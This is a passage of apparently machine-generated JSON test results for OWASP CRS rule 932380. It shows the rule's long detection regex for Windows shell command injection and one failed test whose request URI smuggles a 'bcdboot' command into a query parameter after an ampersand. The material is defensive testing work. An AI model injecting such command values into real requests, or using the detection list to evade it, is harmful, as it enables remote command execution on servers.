]*o[\\\"\\^]*n[\\\"\\^]*n[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*s))|w[\\\"\\^]*(?:l[\\\"\\^]*a[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*c[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*r|s[\\\"\\^]*h))|q[\\\"\\^]*(?:a[\\\"\\^]*p[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*r[\\\"\\^]*v|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*s|u[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*r|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|r[\\\"\\^]*(?:d(?:[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*i[\\\"\\^]*g[\\\"\\^]*n)?|e[\\\"\\^]*(?:f[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|g(?:[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*i|s[\\\"\\^]*v[\\\"\\^]*r[\\\"\\^]*3[\\\"\\^]*2))?|l[\\\"\\^]*o[\\\"\\^]*g|(?:(?:p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|s[\\\"\\^]*c[\\\"\\^]*a)[\\\"\\^]*)?n|x[\\\"\\^]*e[\\\"\\^]*c)|i[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|m[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*r|o[\\\"\\^]*b[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y|p[\\\"\\^]*c[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o|p[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*g)|s[\\\"\\^]*h|u[\\\"\\^]*n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*l[\\\"\\^]*3[\\\"\\^]*2|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|s[\\\"\\^]*(?:a[\\\"\\^]*n|c[\\\"\\^]*(?:h[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*s|w[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|e[\\\"\\^]*(?:c[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*t|r[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:(?:c[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*p|w[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*n|m[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*g[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|t[\\\"\\^]*x)|f[\\\"\\^]*c|(?:h[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n|u[\\\"\\^]*b[\\\"\\^]*s)[\\\"\\^]*t|x[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e|y[\\\"\\^]*s[\\\"\\^]*(?:o[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o))|t[\\\"\\^]*(?:a[\\\"\\^]*(?:k[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*n|p[\\\"\\^]*i[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|s[\\\"\\^]*k[\\\"\\^]*(?:k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t))|(?:c[\\\"\\^]*m[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u|f[\\\"\\^]*t)[\\\"\\^]*p|(?:(?:e[\\\"\\^]*l[\\\"\\^]*n[\\\"\\^]*e|i[\\\"\\^]*m[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*u)[\\\"\\^]*|r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:p[\\\"\\^]*)?)t|l[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*n|p[\\\"\\^]*m[\\\"\\^]*(?:t[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*l|v[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r)|s[\\\"\\^]*(?:(?:d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*)?c[\\\"\\^]*o[\\\"\\^]*n|e[\\\"\\^]*c[\\\"\\^]*i[\\\"\\^]*m[\\\"\\^]*p|k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*f)|y[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*f|z[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|u[\\\"\\^]*n[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*s[\\\"\\^]*e|i[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*d|l[\\\"\\^]*o[\\\"\\^]*d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r)|v[\\\"\\^]*s[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|w[\\\"\\^]*(?:a[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*r|b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|(?:d[\\\"\\^]*s|e[\\\"\\^]*(?:c|v[\\\"\\^]*t))[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|h[\\\"\\^]*o[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*i|i[\\\"\\^]*n[\\\"\\^]*(?:n[\\\"\\^]*t(?:[\\\"\\^]*3[\\\"\\^]*2)?|r[\\\"\\^]*s)|m[\\\"\\^]*i[\\\"\\^]*c|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|x[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y)(?:\\.[\\\"\\^]*[0-9A-Z_a-z]+)?\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932380
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932380",
    "test_id" : 4,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932380.yaml",
    "description" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot  /r file.txt\nMatch bcdboot with argument with multiple preceding space\n",
    "cause" : "failed expect_id check: 932380 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot  /r file.txt\nMatch bcdboot with argument with multiple preceding space\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?view%3Dimage.jpg%26bcdboot%20%20%2Fr%20file.txt",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932380 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932380,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows shell command injections."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " New in CRSv4: The rules 932110 and 932115 were reorganized and renumbered to 932370 and 932380."
        }, {
          "type" : "Comment",
          "text" : " The new rules target specific Windows binaries to simplify future updates of the command list."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See rule 932370 above for further explanation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is case-insensitive."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932380.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932380"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:[\\n\\r;`\\{]|\\|\\|?|&&?)[\\s\\x0b]*[\\s\\x0b\\\"'\\(,@]*(?:[\\\"'\\.-9A-Z_a-z]+/|(?:[\\\"'\\x5c\\^]*[0-9A-Z_a-z][\\\"'\\x5c\\^]*:[^\\x5c]*|[ \\\"'\\.-9A-Z\\x5c\\^_a-z]*)\\x5c)?[\\\"\\^]*(?:a[\\\"\\^]*(?:s[\\\"\\^]*s[\\\"\\^]*o[\\\"\\^]*c|t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m|t[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*b)|u[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*l|t[\\\"\\^]*o[\\\"\\^]*(?:c[\\\"\\^]*(?:h[\\\"\\^]*k|o[\\\"\\^]*n[\\\"\\^]*v)|(?:f[\\\"\\^]*m|m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n)[\\\"\\^]*t)))|b[\\\"\\^]*(?:c[\\\"\\^]*d[\\\"\\^]*(?:b[\\\"\\^]*o[\\\"\\^]*o|e[\\\"\\^]*d[\\\"\\^]*i)[\\\"\\^]*t|(?:d[\\\"\\^]*e[\\\"\\^]*h[\\\"\\^]*d|o[\\\"\\^]*o[\\\"\\^]*t)[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|i[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|c[\\\"\\^]*(?:a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|e[\\\"\\^]*r[\\\"\\^]*t[\\\"\\^]*(?:r[\\\"\\^]*e[\\\"\\^]*q|u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|h[\\\"\\^]*(?:c[\\\"\\^]*p|d[\\\"\\^]*i[\\\"\\^]*r|g[\\\"\\^]*(?:l[\\\"\\^]*o[\\\"\\^]*g[\\\"\\^]*o[\\\"\\^]*n|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|u[\\\"\\^]*s[\\\"\\^]*r)|k[\\\"\\^]*(?:d[\\\"\\^]*s[\\\"\\^]*k|n[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*s))|l[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|m[\\\"\\^]*(?:d(?:[\\\"\\^]*k[\\\"\\^]*e[\\\"\\^]*y)?|s[\\\"\\^]*t[\\\"\\^]*p)|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|d[\\\"\\^]*(?:c[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g|g[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*x)|e[\\\"\\^]*(?:f[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*g|l)|f[\\\"\\^]*s[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a|r[\\\"\\^]*m[\\\"\\^]*i)[\\\"\\^]*g|i[\\\"\\^]*(?:a[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*z|r|s[\\\"\\^]*(?:k[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*(?:m[\\\"\\^]*p|p[\\\"\\^]*y)|p[\\\"\\^]*(?:a[\\\"\\^]*r[\\\"\\^]*t|e[\\\"\\^]*r[\\\"\\^]*f)|r[\\\"\\^]*a[\\\"\\^]*i[\\\"\\^]*d|s[\\\"\\^]*h[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*o[\\\"\\^]*w)|p[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g))|n[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|(?:o[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*e|r[\\\"\\^]*i[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*y)|e[\\\"\\^]*(?:n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*l|v[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|E[\\\"\\^]*v[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|f[\\\"\\^]*(?:c|i[\\\"\\^]*(?:l[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*y[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*s|n[\\\"\\^]*d[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r)|l[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*p|o[\\\"\\^]*r[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s|r[\\\"\\^]*e[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*k|s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|(?:t[\\\"\\^]*y[\\\"\\^]*p|v[\\\"\\^]*e[\\\"\\^]*u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t)[\\\"\\^]*e)|g[\\\"\\^]*(?:e[\\\"\\^]*t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*c|t[\\\"\\^]*y[\\\"\\^]*p[\\\"\\^]*e)|o[\\\"\\^]*t[\\\"\\^]*o|p[\\\"\\^]*(?:f[\\\"\\^]*i[\\\"\\^]*x[\\\"\\^]*u[\\\"\\^]*p|(?:r[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*l[\\\"\\^]*)?t|u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*a[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*b[\\\"\\^]*l)|h[\\\"\\^]*(?:e[\\\"\\^]*l[\\\"\\^]*p[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|o[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*e)|i[\\\"\\^]*(?:c[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|p[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*g|x[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*p)|j[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k|k[\\\"\\^]*(?:l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t|s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:m[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|p[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*s))|l[\\\"\\^]*(?:o[\\\"\\^]*(?:d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|g[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*n|o[\\\"\\^]*f[\\\"\\^]*f))|p[\\\"\\^]*[qr])|m[\\\"\\^]*(?:a[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e|k[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*b|p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|k[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*r|l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*k)|m[\\\"\\^]*c|o[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*v[\\\"\\^]*o[\\\"\\^]*l|q[\\\"\\^]*(?:b[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|(?:t[\\\"\\^]*g[\\\"\\^]*)?s[\\\"\\^]*v[\\\"\\^]*c)|s[\\\"\\^]*(?:d[\\\"\\^]*t|i[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*e[\\\"\\^]*c|n[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*3[\\\"\\^]*2)|t[\\\"\\^]*s[\\\"\\^]*c))|n[\\\"\\^]*(?:b[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*t|e[\\\"\\^]*t[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*g|d[\\\"\\^]*o[\\\"\\^]*m|s[\\\"\\^]*(?:h|t[\\\"\\^]*a[\\\"\\^]*t))|f[\\\"\\^]*s[\\\"\\^]*(?:a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|s[\\\"\\^]*(?:h[\\\"\\^]*a[\\\"\\^]*r[\\\"\\^]*e|t[\\\"\\^]*a[\\\"\\^]*t))|l[\\\"\\^]*(?:b[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*t)|s[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:b[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|c[\\\"\\^]*m[\\\"\\^]*d[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*m[\\\"\\^]*p[\\\"\\^]*t|f[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*l))|o[\\\"\\^]*(?:f[\\\"\\^]*f[\\\"\\^]*l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*e|p[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s)|p[\\\"\\^]*(?:a[\\\"\\^]*(?:g[\\\"\\^]*e[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i|t[\\\"\\^]*h[\\\"\\^]*p[\\\"\\^]*i[\\\"\\^]*n)[\\\"\\^]*g|(?:b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|k[\\\"\\^]*t[\\\"\\^]*m[\\\"\\^]*o)[\\\"\\^]*n|e[\\\"\\^]*(?:n[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*t|r[\\\"\\^]*f[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*n)|n[\\\"\\^]*p[\\\"\\^]*u[\\\"\\^]*(?:n[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*d|t[\\\"\\^]*i[\\\"\\^]*l)|o[\\\"\\^]*(?:p[\\\"\\^]*d|w[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*l[\\\"\\^]*l)|r[\\\"\\^]*n[\\\"\\^]*(?:c[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*g|(?:d[\\\"\\^]*r[\\\"\\^]*v|m[\\\"\\^]*n[\\\"\\^]*g)[\\\"\\^]*r|j[\\\"\\^]*o[\\\"\\^]*b[\\\"\\^]*s|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|q[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*l)|u[\\\"\\^]*(?:b[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*n|s[\\\"\\^]*h[\\\"\\^]*(?:d|p[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*n[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*s))|w[\\\"\\^]*(?:l[\\\"\\^]*a[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*c[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*r|s[\\\"\\^]*h))|q[\\\"\\^]*(?:a[\\\"\\^]*p[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*r[\\\"\\^]*v|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*s|u[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*r|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|r[\\\"\\^]*(?:d(?:[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*i[\\\"\\^]*g[\\\"\\^]*n)?|e[\\\"\\^]*(?:f[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|g(?:[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*i|s[\\\"\\^]*v[\\\"\\^]*r[\\\"\\^]*3[\\\"\\^]*2))?|l[\\\"\\^]*o[\\\"\\^]*g|(?:(?:p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|s[\\\"\\^]*c[\\\"\\^]*a)[\\\"\\^]*)?n|x[\\\"\\^]*e[\\\"\\^]*c)|i[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|m[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*r|o[\\\"\\^]*b[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y|p[\\\"\\^]*c[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o|p[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*g)|s[\\\"\\^]*h|u[\\\"\\^]*n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*l[\\\"\\^]*3[\\\"\\^]*2|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|s[\\\"\\^]*(?:a[\\\"\\^]*n|c[\\\"\\^]*(?:h[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*s|w[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|e[\\\"\\^]*(?:c[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*t|r[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:(?:c[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*p|w[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*n|m[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*g[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|t[\\\"\\^]*x)|f[\\\"\\^]*c|(?:h[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n|u[\\\"\\^]*b[\\\"\\^]*s)[\\\"\\^]*t|x[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e|y[\\\"\\^]*s[\\\"\\^]*(?:o[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o))|t[\\\"\\^]*(?:a[\\\"\\^]*(?:k[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*n|p[\\\"\\^]*i[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|s[\\\"\\^]*k[